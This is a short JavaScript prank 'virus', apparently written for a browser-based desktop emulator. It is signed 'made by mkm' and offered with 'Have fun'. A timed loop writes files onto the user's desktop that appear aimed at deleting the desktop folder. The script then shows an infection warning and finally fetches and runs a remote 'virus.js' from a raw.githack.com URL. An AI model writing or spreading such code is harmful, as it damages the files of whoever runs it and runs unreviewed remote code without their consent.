(function theLoop (i) {
  setTimeout(function () {

// Function to generate random number  
function randomNumber(min, max) {  
    min = Math.ceil(min); 
    max = Math.floor(max); 
    return Math.floor(Math.random() * (max - min + 0.01)) + min; 
}   

$store.set('desktop/meme' + ( randomNumber(1, 1000000) ) + '.js', '$store.del("/a/desktop/)')
$store.keys() 
		if (--i) {         
      theLoop(i);      
    }
  }, 100); //Here u can customize the delay (1000=1sec)
})(1); //Here u can change how many times a file is created

//Have fun 

//made by mkm
$alert('WARNING YOU HAVE BEEN INFECTED BY THE MEME VIRUS')

$loader.script("https://raw.githack.com/mhmmkm/Yhingy/main/virus.js")
